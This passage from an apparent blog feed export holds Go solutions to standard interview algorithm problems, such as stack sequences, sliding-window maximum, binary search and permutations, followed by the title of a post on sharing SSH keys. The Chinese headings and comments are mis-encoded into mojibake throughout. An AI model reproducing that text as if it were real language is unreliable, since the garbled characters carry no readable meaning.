class="comment">minlist.Remove(minlist.Front())</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">mylist.Remove(mylist.Front())</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">func Top() int &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">return mylist.Front().Value.(int)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">func Min() int &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">return minlist.Front().Value.(int)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—"><a href="#æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—" class="headerlink" title="æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—"></a><strong>æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pushV intæ•´å‹ä¸€ç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @param popV intæ•´å‹ä¸€ç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsPopOrder</span><span class="params">( pushV []<span class="keyword">int</span> ,  popV []<span class="keyword">int</span> )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="comment">//é˜Ÿåˆ—å…¥æ ˆï¼Œç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯å‡ºæˆ˜åºåˆ—ï¼Œ</span></span><br><span class="line">    <span class="comment">//æ˜¯çš„è¯å‡ºæˆ˜ï¼Œä¸æ˜¯çš„è¯ç»§ç»­å…¥æ ˆï¼Œç›´åˆ°å…¥æ ˆç»“æŸæœªèƒ½åŒ¹é…å®Œæˆ</span></span><br><span class="line">    <span class="keyword">var</span> stack=<span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">0</span>,<span class="built_in">len</span>(pushV))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(popV)==<span class="number">0</span>||<span class="built_in">len</span>(pushV)==<span class="number">0</span>||<span class="built_in">len</span>(popV)!=<span class="built_in">len</span>(pushV)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å…¥æ ˆ</span></span><br><span class="line">    <span class="keyword">for</span> _,v:=<span class="keyword">range</span> pushV&#123;</span><br><span class="line">            stack=<span class="built_in">append</span>(stack,v)</span><br><span class="line">         <span class="keyword">for</span> <span class="built_in">len</span>(stack)!=<span class="number">0</span>&amp;&amp;stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>]==popV[<span class="number">0</span>]&#123;</span><br><span class="line">                 stack=stack[:<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">                 popV=popV[<span class="number">1</span>:<span class="built_in">len</span>(popV)]</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">len</span>(stack)==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¿»è½¬å•è¯åºåˆ—"><a href="#ç¿»è½¬å•è¯åºåˆ—" class="headerlink" title="ç¿»è½¬å•è¯åºåˆ—"></a><strong>ç¿»è½¬å•è¯åºåˆ—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param str stringå­—ç¬¦ä¸² </span></span><br><span class="line"><span class="comment"> * @return stringå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReverseSentence</span><span class="params">( str <span class="keyword">string</span> )</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> str == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    stringBuilder := bytes.Buffer&#123;&#125;</span><br><span class="line">    array := strings.Split(str, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="built_in">len</span>(array)<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">        stringBuilder.WriteString(array[i])</span><br><span class="line">        <span class="keyword">if</span> i != <span class="number">0</span> &#123;</span><br><span class="line">            stringBuilder.WriteString(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> stringBuilder.String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼"><a href="#æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼" class="headerlink" title="æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼"></a><strong>æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param num intæ•´å‹ä¸€ç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @param size intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxInWindows</span><span class="params">( num []<span class="keyword">int</span> ,  size <span class="keyword">int</span> )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    res := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(num)-size+<span class="number">1</span>)</span><br><span class="line">    deque := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;<span class="built_in">len</span>(num); i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">len</span>(deque) &gt; <span class="number">0</span> &amp;&amp; num[i] &gt; deque[<span class="built_in">len</span>(deque)<span class="number">-1</span>] &#123;</span><br><span class="line">            deque = deque[:<span class="built_in">len</span>(deque)<span class="number">-1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        deque = <span class="built_in">append</span>(deque, num[i])</span><br><span class="line">        <span class="comment">//å½“å‰æœ€æ—©å…ƒç´ å’Œé˜Ÿåˆ—ä¸­æœ€å¤§å…ƒç´ ä¸€è‡´ï¼Œå°±è¦ç§»å‡ºé˜Ÿåˆ—ä¸­æœ€å¤§å…ƒç´ </span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= size &#123;</span><br><span class="line">            <span class="keyword">if</span> num[i-size] == deque[<span class="number">0</span>] &#123;</span><br><span class="line">                deque = deque[<span class="number">1</span>:]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">if</span> i &gt;= size - <span class="number">1</span> &#123;</span><br><span class="line">            res = <span class="built_in">append</span>(res, deque[<span class="number">0</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æœç´¢ç®—æ³•"><a href="#æœç´¢ç®—æ³•" class="headerlink" title="æœç´¢ç®—æ³•"></a>æœç´¢ç®—æ³•</h2><h3 id="æ•°å­—åœ¨å‡åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°"><a href="#æ•°å­—åœ¨å‡åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°" class="headerlink" title="æ•°å­—åœ¨å‡åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°"></a><strong>æ•°å­—åœ¨å‡åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param data intæ•´å‹ä¸€ç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @param k intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetNumberOfK</span><span class="params">( data []<span class="keyword">int</span> ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line"></span><br><span class="line">    r := you(data,k)</span><br><span class="line">    l := zuo(data,k)</span><br><span class="line">    <span class="keyword">if</span> l==<span class="number">-1</span>||r==<span class="number">-1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r-l+<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">you</span><span class="params">(data []<span class="keyword">int</span> ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    l,r := <span class="number">0</span>,<span class="built_in">len</span>(data)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">var</span> mid <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> l&lt;=r&#123;</span><br><span class="line">        mid = (l+r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> data[mid]&gt;k&#123;</span><br><span class="line">            r = mid <span class="number">-1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> r&gt;=<span class="number">0</span>&amp;&amp;r&lt;<span class="built_in">len</span>(data) &amp;&amp; data[r]==k&#123;</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">zuo</span><span class="params">(data []<span class="keyword">int</span> ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    l,r := <span class="number">0</span>,<span class="built_in">len</span>(data)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">var</span> mid <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> l&lt;=r&#123;</span><br><span class="line">        mid = (l+r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> data[mid]&lt;k&#123;</span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            r = mid<span class="number">-1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> l&gt;=<span class="number">0</span>&amp;&amp;l&lt;<span class="built_in">len</span>(data) &amp;&amp; data[l]==k&#123;</span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾"><a href="#äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾" class="headerlink" title="äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾"></a><strong>äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param target intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @param array intæ•´å‹äºŒç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Find</span><span class="params">( target <span class="keyword">int</span> ,  array [][]<span class="keyword">int</span> )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    n, m := <span class="number">0</span>, <span class="built_in">len</span>(array[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> n &lt; <span class="built_in">len</span>(array) &amp;&amp; m &gt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> array[n][m] != target &#123;</span><br><span class="line">            <span class="keyword">if</span> array[n][m] &gt; target &#123;</span><br><span class="line">                m --</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                n ++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—"><a href="#æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—" class="headerlink" title="æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—"></a><strong>æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param rotateArray intæ•´å‹ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 19:08</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">minNumberInRotateArray</span><span class="params">(rotateArray []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">left := <span class="number">0</span></span><br><span class="line">right := <span class="built_in">len</span>(rotateArray) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">mid := left + (right-left)&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> rotateArray[mid] &gt; rotateArray[right] &#123;</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> rotateArray[mid] &lt;= rotateArray[right] &#123;</span><br><span class="line">right = right - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rotateArray[left]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²çš„æ’åˆ—"><a href="#å­—ç¬¦ä¸²çš„æ’åˆ—" class="headerlink" title="å­—ç¬¦ä¸²çš„æ’åˆ—"></a><strong>å­—ç¬¦ä¸²çš„æ’åˆ—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sort&quot;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param str stringå­—ç¬¦ä¸² </span></span><br><span class="line"><span class="comment"> * @return stringå­—ç¬¦ä¸²ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Permutation</span><span class="params">( str <span class="keyword">string</span> )</span>  []<span class="title">string</span></span>&#123;</span><br><span class="line"><span class="comment">// 1.å¯¹strè¿›è¡Œæ’åº</span></span><br><span class="line">sbyte := []<span class="keyword">byte</span>(str)</span><br><span class="line"><span class="keyword">var</span> less <span class="function"><span class="keyword">func</span><span class="params">(i,j <span class="keyword">int</span>)</span><span class="title">bool</span> = <span class="title">func</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> sbyte[i]&lt;=sbyte[j]</span><br><span class="line">&#125;</span><br><span class="line">sort.Slice(sbyte,less)</span><br><span class="line">str = <span class="keyword">string</span>(sbyte)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.å›æº¯æ³•</span></span><br><span class="line">list := <span class="built_in">make</span>([]<span class="keyword">byte</span>,<span class="number">0</span>)</span><br><span class="line">ans := <span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">visited := <span class="built_in">make</span>([]<span class="keyword">bool</span>,<span class="built_in">len</span>(str))</span><br><span class="line"><span class="keyword">var</span> backtrace <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">backtrace = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(str)==<span class="built_in">len</span>(list)&#123;</span><br><span class="line">tmp := <span class="built_in">make</span>([]<span class="keyword">byte</span>,<span class="built_in">len</span>(list))</span><br><span class="line"><span class="built_in">copy</span>(tmp,list)</span><br><span class="line">ans = <span class="built_in">append</span>(ans,<span class="keyword">string</span>(tmp))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>;i &lt; <span class="built_in">len</span>(str);i++ &#123;</span><br><span class="line"><span class="keyword">if</span> visited[i] &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> i&gt;<span class="number">0</span> &amp;&amp; str[i]==str[i<span class="number">-1</span>] &amp;&amp; !visited[i<span class="number">-1</span>] &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">visited[i] = <span class="literal">true</span></span><br><span class="line">list = <span class="built_in">append</span>(list,str[i])</span><br><span class="line">backtrace()</span><br><span class="line">list = list[<span class="number">0</span>:<span class="built_in">len</span>(list)<span class="number">-1</span>]</span><br><span class="line">visited[i] = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    backtrace()</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—"><a href="#æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—" class="headerlink" title="æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—"></a><strong>æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param n intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findNthDigit</span><span class="params">( n <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> dig = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> left, right = <span class="number">0</span>, <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> n &gt; (right - left) * dig &#123;</span><br><span class="line">        n -=  (right - left) * dig</span><br><span class="line">        dig++</span><br><span class="line">        left = right </span><br><span class="line">        right = right * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> num = n / dig + left</span><br><span class="line">    <span class="keyword">var</span> index = n % dig</span><br><span class="line">    str := strconv.Itoa(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>([]<span class="keyword">byte</span>(str)[index] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤šå°ç”µè„‘å…¬ç”¨sshè¿œç¨‹ä»“åº“key</title>
      <link href="/2022/06/07/%E5%A4%9A%E5%8F%B0%E7%94%B5%E8%84%91%E5%85%AC%E7%94%A8ssh%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93key/"/>
      <url>/2022/06/07/%E5%A4%9A%E5%8F%B0%E7%94%B5%E8%84%91%E5%85%AC%E7%94%A8ssh%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93key/</url>
      
